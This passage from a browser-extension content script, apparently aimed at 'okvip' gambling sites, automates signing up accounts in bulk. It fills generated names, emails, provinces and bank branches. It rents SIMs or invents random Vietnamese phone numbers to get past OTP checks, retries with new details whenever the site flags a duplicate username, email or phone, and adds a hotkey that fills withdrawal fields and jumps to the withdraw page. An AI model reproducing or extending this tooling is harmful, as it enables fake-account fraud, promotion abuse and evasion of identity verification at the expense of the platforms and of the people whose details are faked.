        Object.assign(b.style, { position:"absolute", top:"50%", transform:"translateY(-50%)", background:bg, color:"#fff", border:"none", borderRadius:"6px", padding:"6px 9px", cursor:"pointer", fontWeight:"700", fontSize:"12px", whiteSpace:"nowrap", zIndex:"9999", touchAction:"manipulation" });
        b.addEventListener("mousedown", e => e.preventDefault()); return b;
      };
      const btnTK   = mkBtn("__mk_user_btn__",  "🆔 Điền TK", "#1a73e8");
      const btnRand = mkBtn("__mk_user_rand__", "🎲", "#f0ad4e");
      btnTK.style.right = "42px"; btnRand.style.right = "4px";
      async function getNameForNick() {
        if (!MK.state.lastSelectedAccount) {
          try { const v = localStorage.getItem(LAST_ACCOUNT_KEY)||sessionStorage.getItem(LAST_ACCOUNT_KEY); MK.state.lastSelectedAccount = JSON.parse(v||"null"); } catch(e) {}
        }
        if (!MK.state.lastSelectedAccount) { try { await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => { if(s[LAST_NAME_KEY]) MK.state.lastSelectedAccount={name:s[LAST_NAME_KEY],account:""}; res(); })); } catch(e) {} }
        return MK.state.lastSelectedAccount?.name || "Nguyen Van A";
      }
      btnTK.addEventListener("click", async () => {
        let hardUser = "";
        try { hardUser = localStorage.getItem("okvip_hard_username") || ""; } catch(e) {}
        if (!hardUser) { try { hardUser = await new Promise(res => chrome.storage.local.get(["okvip_hard_username"], s => res(s["okvip_hard_username"] || ""))); } catch(e) {} }
        if (hardUser) {
          btnTK.textContent = "⌨️..."; btnTK.disabled = true;
          await typeIntoInput(userEl, hardUser);
          await new Promise(r => setTimeout(r, 300));
          const actualNick = userEl.value.trim() || hardUser;
          try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
          try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
          const confirmEl = getConfirmUsernameInput();
          if (confirmEl) await typeIntoInput(confirmEl, actualNick);
          btnTK.textContent = "✅ Xong"; btnTK.style.background = "#2e7d32";
          setTimeout(() => { btnTK.innerHTML = "🆔 Điền TK"; btnTK.style.background = "#1a73e8"; btnTK.disabled = false; }, 1500);
        } else {
          const name = await getNameForNick();
          await showNickPicker(name, async (nick) => {
            btnTK.textContent = "⌨️..."; btnTK.disabled = true;
            await typeIntoInput(userEl, nick);
            await new Promise(r => setTimeout(r, 300));
            const actualNick = userEl.value.trim() || nick;
            try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
            try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
            const confirmEl = getConfirmUsernameInput();
            if (confirmEl) await typeIntoInput(confirmEl, actualNick);
            btnTK.textContent = "✅ Xong"; btnTK.style.background = "#2e7d32";
            setTimeout(() => { btnTK.innerHTML = "🆔 Điền TK"; btnTK.style.background = "#1a73e8"; btnTK.disabled = false; }, 1500);
          });
        }
      });
      btnRand.addEventListener("click", async () => {
        btnRand.disabled = true;
        const hardUser = await getHardUsername();
        let fillVal;
        if (hardUser) { fillVal = hardUser; }
        else { const name = await getNameForNick(); const _opts = await genNickOptions(name); fillVal = _opts[Math.floor(Math.random()*_opts.length)].value; }
        await typeIntoInput(userEl, fillVal);
        await new Promise(r => setTimeout(r, 300));
        const actualNick = userEl.value.trim() || fillVal;
        try { chrome.storage.local.set({[LAST_USERNAME_KEY]: actualNick}); } catch(e) {}
        try { localStorage.setItem(LAST_USERNAME_KEY, actualNick); } catch(e) {}
        const confirmEl = getConfirmUsernameInput();
        if (confirmEl) await typeIntoInput(confirmEl, actualNick);
        showToast((hardUser ? "🆔 " : "🎲 ") + actualNick, "info");
        btnRand.disabled = false;
      });
      wrap.appendChild(btnTK); wrap.appendChild(btnRand);
      userEl.addEventListener('change', () => { const val = userEl.value.trim(); if (!val) return; try { chrome.storage.local.set({[LAST_USERNAME_KEY]: val}); } catch(e) {} try { localStorage.setItem(LAST_USERNAME_KEY, val); } catch(e) {} });
      userEl.addEventListener('blur',   () => { const val = userEl.value.trim(); if (!val) return; try { chrome.storage.local.set({[LAST_USERNAME_KEY]: val}); } catch(e) {} try { localStorage.setItem(LAST_USERNAME_KEY, val); } catch(e) {} });
    })();

    ;(function injectConfirmUsernameBtn() {
      if (document.getElementById("__mk_confirmtk_btn__")) return;
      const confirmEl = getConfirmUsernameInput();
      if (!confirmEl) return;
      if (confirmEl.closest("#__mk_confirmtk_wrap__")) return;
      const wrap = document.createElement("div"); wrap.id = "__mk_confirmtk_wrap__";
      wrap.style.cssText = "position:relative;display:block;width:100%;";
      confirmEl.parentNode.insertBefore(wrap, confirmEl); wrap.appendChild(confirmEl);
      confirmEl.style.setProperty("padding-right", "130px", "important");
      const btnC = document.createElement("button"); btnC.id = "__mk_confirmtk_btn__"; btnC.type = "button"; btnC.innerHTML = "🔄 Điền Lại TK";
      Object.assign(btnC.style, { position:"absolute", top:"50%", transform:"translateY(-50%)", right:"4px", background:"#1a73e8", color:"#fff", border:"none", borderRadius:"6px", padding:"6px 9px", cursor:"pointer", fontWeight:"700", fontSize:"12px", whiteSpace:"nowrap", zIndex:"9999", touchAction:"manipulation" });
      btnC.addEventListener("mousedown", e => e.preventDefault());
      btnC.addEventListener("click", async () => {
        const mainEl = getUsernameInput(); let nick = mainEl?.value?.trim() || "";
        if (!nick) { try { await new Promise(res => chrome.storage.local.get([LAST_USERNAME_KEY], s => { nick = s[LAST_USERNAME_KEY]||""; res(); })); } catch(e) {} }
        if (!nick) { showToast("⚠️ Điền TK chính trước!", "error"); return; }
        btnC.textContent = "⌨️..."; btnC.disabled = true;
        await typeIntoInput(confirmEl, nick);
        btnC.textContent = "✅ Xong"; btnC.style.background = "#2e7d32";
        setTimeout(() => { btnC.innerHTML = "🔄 Điền Lại TK"; btnC.style.background = "#1a73e8"; btnC.disabled = false; }, 1500);
      });
      wrap.appendChild(btnC);
    })();

    if (!document.getElementById("__mk_email_btn__")) {
      const emailEl = getEmailInput();
      if (emailEl && !emailEl.closest("#__mk_email_wrapper__")) {
        const w = document.createElement("div"); w.id = "__mk_email_wrapper__";
        w.style.cssText = "position:relative;display:block;width:100%;";
        emailEl.parentNode.insertBefore(w, emailEl); w.appendChild(emailEl); emailEl.style.paddingRight = "160px";
        const btnGmail = document.createElement("button"); btnGmail.id = "__mk_email_btn__"; btnGmail.type = "button"; btnGmail.innerHTML = "📧 Gmail";
        Object.assign(btnGmail.style, { position:"absolute", right:"42px", top:"50%", transform:"translateY(-50%)", background:"#ea4335", color:"#fff", border:"none", borderRadius:"6px", padding:"6px 10px", cursor:"pointer", fontWeight:"700", fontSize:"12px", zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation" });
        btnGmail.addEventListener("mousedown", e => e.preventDefault());
        btnGmail.addEventListener("click", async () => {
          if (!MK.state.lastSelectedAccount) { try { await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => { if (s[LAST_NAME_KEY]) MK.state.lastSelectedAccount = { name: s[LAST_NAME_KEY], account: "" }; res(); })); } catch(e) {} }
          if (!MK.state.lastSelectedAccount) MK.state.lastSelectedAccount = { name: "Nguyen Van A", account: "" };
          const overlay = document.createElement("div"); overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
          const box = document.createElement("div"); box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:80vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
          box.innerHTML = `<div style="padding:12px 16px;background:#ea4335;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">📧 Chọn Gmail<button id="__em_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button></div><div style="padding:6px 12px;background:#fce8e6;font-size:12px;color:#ea4335;font-weight:600;">👤 <b>${MK.state.lastSelectedAccount.name}</b></div><div id="__em_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"></div>`;
          overlay.appendChild(box); document.body.appendChild(overlay);
          const closeEM = () => overlay.remove();
          overlay.addEventListener("click", e => { if(e.target===overlay) closeEM(); });
          box.querySelector("#__em_close__").addEventListener("click", closeEM);
          let curOpts = await genEmailOptions(MK.state.lastSelectedAccount.name);
          function renderEM(opts) {
            const listEl = box.querySelector("#__em_list__"); listEl.innerHTML = "";
            opts.forEach((o, idx) => {
              const row = document.createElement("div"); row.style.cssText = "padding:8px 10px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;gap:8px;";
              row.innerHTML = `<div style="flex:1;min-width:0;"><div style="font-weight:700;font-size:12px;color:#111;font-family:monospace;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" id="__em_val_${idx}__">${o.value}</div><div style="font-size:10px;color:#999;">${o.label}</div></div><button data-idx="${idx}" class="__em_pick__" style="padding:5px 10px;background:#ea4335;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:700;cursor:pointer;flex-shrink:0;">✅</button><button data-idx="${idx}" class="__em_rand__" style="padding:5px 8px;background:#f0ad4e;color:#fff;border:none;border-radius:6px;font-size:13px;cursor:pointer;flex-shrink:0;">🎲</button>`;
              listEl.appendChild(row);
            });
            listEl.querySelectorAll(".__em_pick__").forEach(b => { b.addEventListener("click", async () => { const idx = parseInt(b.dataset.idx); closeEM(); btnGmail.textContent = "⌨️..."; btnGmail.disabled = true; await typeIntoInput(getEmailInput(), curOpts[idx].value); btnGmail.textContent = "✅ Xong"; btnGmail.style.background = "#2e7d32"; setTimeout(() => { btnGmail.innerHTML = "📧 Gmail"; btnGmail.style.background = "#ea4335"; btnGmail.disabled = false; }, 1500); }); });
            listEl.querySelectorAll(".__em_rand__").forEach(b => { b.addEventListener("click", async () => { const idx = parseInt(b.dataset.idx); const fresh = await genEmailOptions(MK.state.lastSelectedAccount.name); curOpts[idx] = fresh[idx]; const valEl = listEl.querySelector(`#__em_val_${idx}__`); if (valEl) valEl.textContent = curOpts[idx].value; }); });
          }
          renderEM(curOpts);
        });
        const btnRandEM = document.createElement("button"); btnRandEM.id = "__mk_email_rand__"; btnRandEM.type = "button"; btnRandEM.innerHTML = "🎲";
        Object.assign(btnRandEM.style, { position:"absolute", right:"4px", top:"50%", transform:"translateY(-50%)", background:"#f0ad4e", color:"#fff", border:"none", borderRadius:"6px", padding:"6px 8px", cursor:"pointer", fontWeight:"700", fontSize:"13px", zIndex:"9999", whiteSpace:"nowrap", touchAction:"manipulation" });
        btnRandEM.addEventListener("mousedown", e => e.preventDefault());
        btnRandEM.addEventListener("click", async () => {
          if (!MK.state.lastSelectedAccount) { try { await new Promise(res => chrome.storage.local.get([LAST_NAME_KEY], s => { if (s[LAST_NAME_KEY]) MK.state.lastSelectedAccount = { name: s[LAST_NAME_KEY], account: "" }; res(); })); } catch(e) {} }
          if (!MK.state.lastSelectedAccount) MK.state.lastSelectedAccount = { name: "Nguyen Van A", account: "" };
          const opts = await genEmailOptions(MK.state.lastSelectedAccount.name);
          const pick = opts[Math.floor(Math.random() * opts.length)];
          btnRandEM.disabled = true;
          await typeIntoInput(getEmailInput(), pick.value);
          showToast("📧 " + pick.value, "info");
          btnRandEM.disabled = false;
        });
        w.appendChild(btnGmail); w.appendChild(btnRandEM);
      }
    }

    (function injectCity() {
      if (document.getElementById("__mk_city_btn__")) return;
      const cityEl = getCityInput();
      if (!cityEl) return;
      if (cityEl.closest("#__mk_city_wrapper__")) return;
      const parent = cityEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.id = parent.id || "__mk_city_wrapper__";
      cityEl.style.paddingRight = "176px"; cityEl.style.boxSizing = "border-box";

      async function openCityPicker() {
        const overlay = document.createElement("div"); overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
        const box = document.createElement("div"); box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
        box.innerHTML = `<div style="padding:12px 16px;background:#6f42c1;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">🏙️ Chọn Tỉnh / Thành phố<button id="__ct_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button></div><div style="display:flex;border-bottom:2px solid #6f42c1;"><button id="__ct_tab63__" style="flex:1;padding:8px;background:#6f42c1;color:#fff;border:none;font-weight:700;font-size:12px;cursor:pointer;">63 tỉnh (cũ)</button><button id="__ct_tab34__" style="flex:1;padding:8px;background:#e9e0ff;color:#6f42c1;border:none;font-weight:700;font-size:12px;cursor:pointer;">34 tỉnh (mới)</button></div><div style="padding:8px 10px;border-bottom:1px solid #eee;"><input id="__ct_search__" type="text" placeholder="🔍 Tìm tỉnh thành..." style="width:100%;padding:8px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;box-sizing:border-box;"/></div><div id="__ct_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"><div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">⏳ Đang tải...</div></div>`;
        overlay.appendChild(box); document.body.appendChild(overlay);
        let activeList = [];
        let provinces = { p63: [], p34: [] };
        const closeCT = () => overlay.remove();
        overlay.addEventListener("click", e => { if (e.target === overlay) closeCT(); });
        box.querySelector("#__ct_close__").addEventListener("click", closeCT);
        function renderCT(list) {
          const listEl = box.querySelector("#__ct_list__"); listEl.innerHTML = "";
          if (!list.length) { listEl.innerHTML = `<div style="text-align:center;padding:16px;color:#aaa;font-size:13px;">Không có kết quả</div>`; return; }
          list.forEach(p => {
            const row = document.createElement("div"); row.style.cssText = "padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:600;color:#222;";
            row.textContent = p;
            row.addEventListener("mouseenter", () => row.style.background = "#f3eeff");
            row.addEventListener("mouseleave", () => row.style.background = "");
            row.addEventListener("click", async () => { closeCT(); const el = getCityInput(); if (el) await typeIntoInput(el, p); showToast("🏙️ " + p, "info"); });
            listEl.appendChild(row);
          });
        }
        function setTab(mode) {
          activeList = mode === 63 ? provinces.p63 : provinces.p34;
          box.querySelector("#__ct_tab63__").style.cssText = `flex:1;padding:8px;background:${mode===63?"#6f42c1":"#e9e0ff"};color:${mode===63?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__ct_tab34__").style.cssText = `flex:1;padding:8px;background:${mode===34?"#6f42c1":"#e9e0ff"};color:${mode===34?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__ct_search__").value = ""; renderCT(activeList);
        }
        box.querySelector("#__ct_tab63__").addEventListener("click", () => setTab(63));
        box.querySelector("#__ct_tab34__").addEventListener("click", () => setTab(34));
        box.querySelector("#__ct_search__").addEventListener("input", e => { const kw = e.target.value.trim().toLowerCase(); renderCT(kw ? activeList.filter(p => p.toLowerCase().includes(kw)) : activeList); });
        provinces = await fetchProvinces();
        setTab(63);
      }

      const btnCity = document.createElement("button"); btnCity.id = "__mk_city_btn__"; btnCity.type = "button"; btnCity.innerHTML = "🏙️ Tỉnh/TP";
      btnCity.style.cssText = "position:absolute;right:46px;top:50%;transform:translateY(-50%);background:#6f42c1;color:#fff;border:none;border-radius:6px;padding:5px 9px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;max-width:90px;";
      btnCity.addEventListener("mousedown", e => e.preventDefault()); btnCity.addEventListener("click", openCityPicker);
      const btnRandCity = document.createElement("button"); btnRandCity.id = "__mk_city_rand__"; btnRandCity.type = "button"; btnRandCity.innerHTML = "🎲";
      btnRandCity.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f0ad4e;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;font-weight:700;font-size:13px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btnRandCity.addEventListener("mousedown", e => e.preventDefault());
      btnRandCity.addEventListener("click", async () => { const { p63 } = await fetchProvinces(); const pick = pickRand(p63); btnRandCity.disabled = true; const el = getCityInput(); if (el) await typeIntoInput(el, pick); showToast("🏙️ " + pick, "info"); btnRandCity.disabled = false; });
      parent.appendChild(btnCity); parent.appendChild(btnRandCity);
      setTimeout(async () => { const el = getCityInput(); if (el && !el.value.trim()) { const { p63 } = await fetchProvinces(); const pick = pickRand(p63); await typeIntoInput(el, pick); showToast("🏙️ " + pick, "info"); } }, 300);
    })();

    (function injectBankBranch() {
      if (document.getElementById("__mk_branch_btn__")) return;
      const branchEl = document.querySelector('input[name="customBankBranch"]');
      if (!branchEl) return;
      if (branchEl.closest("#__mk_branch_wrapper__")) return;
      const parent = branchEl.parentElement;
      if (!parent) return;
      if (getComputedStyle(parent).position === "static") parent.style.position = "relative";
      parent.id = parent.id || "__mk_branch_wrapper__";
      branchEl.style.paddingRight = "176px"; branchEl.style.boxSizing = "border-box";
      const btnBranch = document.createElement("button"); btnBranch.id = "__mk_branch_btn__"; btnBranch.type = "button"; btnBranch.innerHTML = "🏙️ Tỉnh/TP";
      btnBranch.style.cssText = "position:absolute;right:46px;top:50%;transform:translateY(-50%);background:#6f42c1;color:#fff;border:none;border-radius:6px;padding:5px 9px;cursor:pointer;font-weight:700;font-size:11px;z-index:9999;white-space:nowrap;touch-action:manipulation;max-width:90px;";
      btnBranch.addEventListener("mousedown", e => e.preventDefault());
      btnBranch.addEventListener("click", async () => {
        const overlay = document.createElement("div"); overlay.style.cssText = "position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,0.45);display:flex;align-items:center;justify-content:center;";
        const box = document.createElement("div"); box.style.cssText = "background:#fff;border-radius:12px;width:90vw;max-width:380px;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 8px 32px rgba(0,0,0,0.25);overflow:hidden;font-family:-apple-system,Arial,sans-serif;";
        box.innerHTML = `<div style="padding:12px 16px;background:#6f42c1;color:#fff;font-weight:700;font-size:14px;display:flex;justify-content:space-between;align-items:center;">🏙️ Chọn Tỉnh / Thành phố<button id="__br_close__" style="background:none;border:none;color:#fff;font-size:22px;cursor:pointer;line-height:1;">✕</button></div><div style="display:flex;border-bottom:2px solid #6f42c1;"><button id="__br_tab63__" style="flex:1;padding:8px;background:#6f42c1;color:#fff;border:none;font-weight:700;font-size:12px;cursor:pointer;">63 tỉnh (cũ)</button><button id="__br_tab34__" style="flex:1;padding:8px;background:#e9e0ff;color:#6f42c1;border:none;font-weight:700;font-size:12px;cursor:pointer;">34 tỉnh (mới)</button></div><div style="padding:8px 10px;border-bottom:1px solid #eee;"><input id="__br_search__" type="text" placeholder="🔍 Tìm tỉnh thành..." style="width:100%;padding:8px 10px;border:1.5px solid #ddd;border-radius:8px;font-size:13px;outline:none;box-sizing:border-box;"/></div><div id="__br_list__" style="overflow-y:auto;flex:1;padding:4px 0;-webkit-overflow-scrolling:touch;"><div style="text-align:center;padding:20px;color:#aaa;font-size:13px;">⏳ Đang tải...</div></div>`;
        overlay.appendChild(box); document.body.appendChild(overlay);
        let activeList = [];
        let provinces = { p63: [], p34: [] };
        const closeOverlay = () => overlay.remove();
        overlay.addEventListener("click", e => { if (e.target === overlay) closeOverlay(); });
        box.querySelector("#__br_close__").addEventListener("click", closeOverlay);
        function renderList(list) {
          const listEl = box.querySelector("#__br_list__"); listEl.innerHTML = "";
          if (!list.length) { listEl.innerHTML = `<div style="text-align:center;padding:16px;color:#aaa;font-size:13px;">Không có kết quả</div>`; return; }
          list.forEach(p => {
            const row = document.createElement("div"); row.style.cssText = "padding:11px 14px;cursor:pointer;border-bottom:1px solid #f5f5f5;font-size:13px;font-weight:600;color:#222;";
            row.textContent = p;
            row.addEventListener("mouseenter", () => row.style.background = "#f3eeff");
            row.addEventListener("mouseleave", () => row.style.background = "");
            row.addEventListener("click", async () => { closeOverlay(); const el = document.querySelector('input[name="customBankBranch"]'); if (el) await typeIntoInput(el, p); showToast("🏙️ " + p, "info"); });
            listEl.appendChild(row);
          });
        }
        function setTab(mode) {
          activeList = mode === 63 ? provinces.p63 : provinces.p34;
          box.querySelector("#__br_tab63__").style.cssText = `flex:1;padding:8px;background:${mode===63?"#6f42c1":"#e9e0ff"};color:${mode===63?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__br_tab34__").style.cssText = `flex:1;padding:8px;background:${mode===34?"#6f42c1":"#e9e0ff"};color:${mode===34?"#fff":"#6f42c1"};border:none;font-weight:700;font-size:12px;cursor:pointer;`;
          box.querySelector("#__br_search__").value = ""; renderList(activeList);
        }
        box.querySelector("#__br_tab63__").addEventListener("click", () => setTab(63));
        box.querySelector("#__br_tab34__").addEventListener("click", () => setTab(34));
        box.querySelector("#__br_search__").addEventListener("input", e => { const kw = e.target.value.trim().toLowerCase(); renderList(kw ? activeList.filter(p => p.toLowerCase().includes(kw)) : activeList); });
        provinces = await fetchProvinces();
        setTab(63);
      });
      const btnRandBranch = document.createElement("button"); btnRandBranch.id = "__mk_branch_rand__"; btnRandBranch.type = "button"; btnRandBranch.innerHTML = "🎲";
      btnRandBranch.style.cssText = "position:absolute;right:4px;top:50%;transform:translateY(-50%);background:#f0ad4e;color:#fff;border:none;border-radius:6px;padding:6px 12px;cursor:pointer;font-weight:700;font-size:13px;z-index:9999;white-space:nowrap;touch-action:manipulation;";
      btnRandBranch.addEventListener("mousedown", e => e.preventDefault());
      btnRandBranch.addEventListener("click", async () => { const { p63 } = await fetchProvinces(); const pick = pickRand(p63); btnRandBranch.disabled = true; const el = document.querySelector('input[name="customBankBranch"]'); if (el) await typeIntoInput(el, pick); showToast("🏙️ " + pick, "info"); btnRandBranch.disabled = false; });
      parent.appendChild(btnBranch); parent.appendChild(btnRandBranch);
      setTimeout(async () => { const el = document.querySelector('input[name="customBankBranch"]'); if (el && !el.value.trim()) { const { p63 } = await fetchProvinces(); const pick = pickRand(p63); await typeIntoInput(el, pick); showToast("🏙️ " + pick, "info"); } }, 300);
    })();

    const phone = findPhoneInput();
    if (phone) {
      injectSimBtn(phone, "okvip-btn-phone", "📲 Điền SĐT", "#ff6b00", handleFillPhoneClick);
      const isVerifyStep = /\d+\*\d+/.test(phone.placeholder || "");
      if (!phone.value && isVerifyStep) {
        try {
          const sim = JSON.parse(localStorage.getItem(CURRENT_SIM_KEY) || "null");
          if (sim?.phone) {
            setTimeout(() => {
              if (!phone.value) {
                const _val = needsLeadingZero(phone) ? sim.phone : stripZero(sim.phone);
                fillInput(phone, _val);
                setTimeout(() => { if (!phone.value) fillInput(phone, sim.phone); }, 500);
              }
            }, 400);
          }
        } catch(e) {}
      }
    }
    const otp = findOtpInput();
    if (otp) injectSimBtn(otp, "okvip-btn-otp", "📨 Lấy OTP", "#28a745", handleOtpClick);
  }

  tryInjectAll();
  injectTKKMBtn();
  injectCaptchaBtn();

  // ========== HELPER: ẤN THEO XPATH ==========
  function clickByXPath(xpath) {
    try {
      const el = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
      if (el) { const target = el.closest('a,button') || el; target.click(); return true; }
    } catch(e) {}
    return false;
  }

  // Bắn nhiều loại event để chắc Angular bắt được (một số component cần mousedown trước click)
  function fireClick(el) {
    if (!el) return;
    const opts = { bubbles: true, cancelable: true, composed: true, view: window };
    try { el.dispatchEvent(new MouseEvent('mousedown', opts)); } catch(e) {}
    try { el.dispatchEvent(new MouseEvent('mouseup', opts)); } catch(e) {}
    try { el.dispatchEvent(new MouseEvent('click', opts)); } catch(e) {}
    if (typeof el.click === 'function') { try { el.click(); } catch(e) {} }
  }

  // ========== ẤN VÀO MENU "RÚT TIỀN" ==========
  function tryClickRutTienMenu() {
    // 1. Ưu tiên theo translate attribute (ổn định qua các bản build)
    let el = document.querySelector('span[translate="MemberCenter_OnlineWithdraw"]');
    if (el) { fireClick(el.closest('a,button') || el); return true; }

    // 2. Bám theo icon class "withdraw" — không phụ thuộc cấu trúc li/a
    const icon = document.querySelector('i.withdraw');
    if (icon) {
      let node = icon.parentElement;
      for (let depth = 0; node && depth < 4; depth++, node = node.parentElement) {
        fireClick(node);
      }
      return true;
    }

    // 3. Xpath cụ thể: trang app-home / app-member-info
    if (clickByXPath('/html/body/app-root/app-sample-layout/div/app-home/app-member-info/div/ul/li[2]/p')) return true;
    // 4. Xpath cụ thể: trang app-member-center
    if (clickByXPath('/html/body/app-root/app-sample-layout/div/app-member-center/app-member-center-title/div/div[2]/ul/li[2]/a/span')) return true;

    // 5. Fallback cuối: quét mọi thẻ theo text "Rút Tiền", không ràng buộc li/a
    const found = [...document.querySelectorAll('p, span')].find(n => (n.textContent || '').trim() === 'Rút Tiền');
    if (found) { fireClick(found.closest('a,button,li,div') || found.parentElement || found); return true; }

    return false;
  }

  // ========== PHÍM TẮT Ctrl+Q ==========
  if (!window.__MK_HOTKEY_CTRL_Q__) {
    window.__MK_HOTKEY_CTRL_Q__ = true;
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && !e.shiftKey && !e.altKey && (e.key === 'q' || e.key === 'Q')) {
        e.preventDefault(); e.stopPropagation();
        const stkBtn  = document.getElementById('__mk_stk_btn__');
        const nameBtn = document.getElementById('__mk_name_btn__');
        const wdBtns  = [...document.querySelectorAll('button[id^="__mk_wdpw_btn_"]')];
        if (stkBtn) { stkBtn.click(); if (wdBtns.length) wdBtns.forEach(btn => btn.click()); showToast('⌨️ Ctrl+Q → Điền STK' + (wdBtns.length ? ' + MK Rút' : ''), 'info'); }
        else if (nameBtn) { nameBtn.click(); showToast('⌨️ Ctrl+Q → Điền Tên', 'info'); }
        else if (wdBtns.length) { wdBtns.forEach(btn => btn.click()); showToast('⌨️ Ctrl+Q → MK Rút', 'info'); }
        else if (tryClickRutTienMenu()) {
          showToast('⌨️ Ctrl+Q → Vào Rút Tiền', 'info');
          // Sau khi vào trang Rút Tiền, đợi DOM load rồi tự ấn icon thêm ngân hàng (nếu có)
          waitAndClickBankAdd();
        }
        else { showToast('⚠️ Ctrl+Q: Không tìm thấy nút nào', 'error'); }
      }
    }, true);
  }

  // ========== AUTO RETRY USERNAME ==========
  let _retryingUsername = false;
  const DUPE_REGEX = /tên tài khoản này đã tồn tại|tài khoản đã tồn tại|username.*exist|đã được sử dụng|already.*taken|account.*exist|ID người chơi này đã có người dùng|id.*đã có người dùng/i;
  const PW_FMT_REGEX = /mật khẩu sai định dạng|mat khau sai|ít nhất.*6|password.*format|password.*invalid|định dạng mật khẩu/i;
  const EMAIL_DUPE_REGEX = /email này đã tồn tại|email.*đã tồn tại|email.*already|email.*exist|email.*used|email.*registered|địa chỉ email.*tồn tại|email.*duplicate|email này đã đăng ký|email.*đã đăng ký.*tài khoản/i;
  const PHONE_DUPE_REGEX = /số điện thoại này đã tồn tại|phone.*đã tồn tại|phone.*already|phone.*exist|phone.*used|phone.*registered|số điện thoại.*tồn tại|sđt.*tồn tại|mobile.*exist/i;
  let _retryingEmail = false;
  let _retryingPhone = false;

  async function checkAndRetryPhone() {
    if (_retryingPhone) return;
    const dialogText = document.querySelector('mat-dialog-content,mat-snack-bar-container,[class*="dialog"],[class*="modal"],[class*="toast"],[class*="alert"],[class*="message"],[class*="error"]')?.innerText || document.body.innerText || '';
    if (!PHONE_DUPE_REGEX.test(dialogText)) return;
    _retryingPhone = true; await sleep(300);
    const closeBtn = document.querySelector('mat-dialog-container button,[mat-dialog-close],[class*="dialog"] button[class*="close"],[class*="modal"] button[class*="close"]');
    if (closeBtn) { closeBtn.click(); await sleep(200); }
    const phoneEl = findPhoneInput();
    if (!phoneEl) { _retryingPhone = false; return; }
    let currentSim = null;
    try { currentSim = JSON.parse(localStorage.getItem(CURRENT_SIM_KEY) || 'null'); } catch(e) {}
    const apiKey = localStorage.getItem(API_KEY_STORE) || '';
    const type = detectType(apiKey);
    if (currentSim && apiKey && type) { try { await cancelSim(currentSim, apiKey); } catch(e) {} }
    let newPhone = '';
    if (apiKey && type) {
      const res = await rentNewSim(apiKey, type);
      if (res) { setStorage({ [CURRENT_SIM_KEY]: JSON.stringify(res.simObj) }); newPhone = res.phone; showToast('📱 SIM mới: ' + newPhone, 'success'); }
      else { newPhone = genRandomVNPhone(); showToast('🎲 Random SĐT: ' + newPhone, 'info'); }
    } else { newPhone = genRandomVNPhone(); showToast('🎲 Random SĐT: ' + newPhone, 'info'); }
    if (newPhone) { try { chrome.storage.local.set({ [LAST_PHONE_KEY]: newPhone }); } catch(e) {} doFillPhone(newPhone); }
    await sleep(400); _retryingPhone = false;
  }

  async function checkAndRetryEmail() {
    if (_retryingEmail) return;
    const alertMsg = document.getElementById('mobile-alert-modal-msg');
    const alertText = alertMsg?.textContent?.trim() || '';
    const dialogText = alertText || document.querySelector('mat-dialog-content,mat-snack-bar-container,[class*="dialog"],[class*="modal"],[class*="toast"],[class*="alert"],[class*="message"],[class*="error"]')?.innerText || document.body.innerText || '';
    if (!EMAIL_DUPE_REGEX.test(dialogText)) return;
    _retryingEmail = true; await sleep(300);
    const emailEl = getEmailInput();
    if (!emailEl) { _retryingEmail = false; return; }
    let fullName = '';
    try { fullName = localStorage.getItem('okvip_last_name_real') || ''; } catch(e) {}
    if (!fullName && MK.state.lastSelectedAccount?.name) fullName = MK.state.lastSelectedAccount.name;
    if (!fullName) { try { fullName = await new Promise(res => chrome.storage.local.get(['okvip_last_name_real'], s => res(s['okvip_last_name_real'] || ''))); } catch(e) {} }
    if (!fullName) fullName = 'Nguyen Van A';
